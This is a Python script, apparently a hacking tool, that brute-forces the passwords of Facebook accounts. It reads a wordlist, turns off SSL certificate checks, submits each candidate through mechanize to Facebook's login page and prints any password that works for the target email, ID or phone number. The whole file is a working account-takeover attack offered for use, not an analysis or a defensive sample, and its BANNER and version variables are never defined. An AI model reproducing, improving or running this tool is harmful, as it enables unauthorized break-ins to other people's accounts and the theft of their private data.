import os
import re
import ssl
import sys
import time
import logging
import optparse
import mechanize

logger = logging.getLogger("Facebook Brute Log")
logger_handler = logging.StreamHandler(sys.stdout)
logger_formatter = logging.Formatter('\r[%(asctime)s] %(message)s', '%H:%M:%S')
logger_handler.setFormatter(logger_formatter)
logger.addHandler(logger_handler)
logger.setLevel(logging.DEBUG)

try:
    ssl._create_default_https_context = ssl._create_unverified_context
except AttributeError:
    pass


def run(email, wordlist, agent, timeout):
    now = time.strftime("%X")

    print("\n[*] starting at %s\n" % now)
    url = "https://www.facebook.com/login.php?login_attempt=1"
    regexp = re.compile(re.findall("/(.*)\?", url)[0])
    cj = mechanize.LWPCookieJar()
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_redirect(True)
    br.set_handle_refresh(mechanize.HTTPRefreshProcessor(), max_time=1)
    br.set_cookiejar(cj);
    cj.clear()
    br.addheaders = [('User-agent', agent)]
    br.open(url, timeout=timeout)
    form = br.forms()[0]
    fp = open(wordlist, "rb")
    wordlist = fp.readlines()
    print("\033[01;34m")
    msg = "target: " + email;
    logger.info(msg)
    msg = "wordlist: %d password" % len(wordlist);
    logger.info(msg)
    print("\033[0m")
    while len(wordlist) <> 0:
        password = wordlist.pop(0).strip()
        msg = "trying credential => {0}:{1}".format(email, password);
        logger.info(msg)
        form["email"] = email
        form["pass"] = password
        response = br.open(form.click(), timeout=timeout)
        _url = response.geturl()
        if not regexp.search(_url) or regexp.pattern not in _url:
            print("\033[01;32m")
            msg = "valid credential: ";
            logger.info(msg)
            msg = "email|id: " + email;
            logger.debug(msg)
            msg = "password: " + password;
            logger.debug(msg)
            print("\033[0m")
            raise SystemExit

    msg = "Password Cannot Be Founded: " + fp.name;
    logger.critical(msg)


def main():
    print(BANNER)
    parser = optparse.OptionParser(version=__version__ + "#dev")
    try:
        parser.add_option("-t", "--target", dest="accountTarget", metavar="<target>",
                          help="target bisa berupa (EM)ail, (ID) or (Phone Number)")
        parser.add_option("-w", "--wordlist", dest="wordList", metavar="<file>",
                          help="file wordlist untuk mencari password target")
        parser.add_option("--timeout", dest="timeout", metavar="<sec>", type="float",
                          help="waktu sebelum koneksi dimulai (default: 30)", default=30)
        parser.add_option("--user-agent", dest="agent", metavar="<agent>",
                          help="HTTP user-agent header value (default: \"Mozilla 0.5\")", default="Mozilla 0.5")

        (args, _) = parser.parse_args()

        if not args.accountTarget:
            parser.error("try '-h' for more information")
    except (optparse.OptionError, TypeError) as e:
        parser.error(e)

    if args.accountTarget and args.wordList:
        try:
            if not os.path.isfile(args.wordList):
                msg = "no such file or directory: %s" % args.wordList;
                logger.critical(msg)
                raise SystemExit

            run(args.accountTarget, args.wordList, args.agent, args.timeout)
        except Exception as msg:
            logger.error(msg)

        except SystemExit:
            pass

        except KeyboardInterrupt as e:
            msg = "user aborted";
            logger.warn(msg)

        finally:
            try:
                print("\n[-] shutting down at %s\n\n" % time.strftime("%X"))
            except:
                pass
            return;


if __name__ == "__main__":
    main()
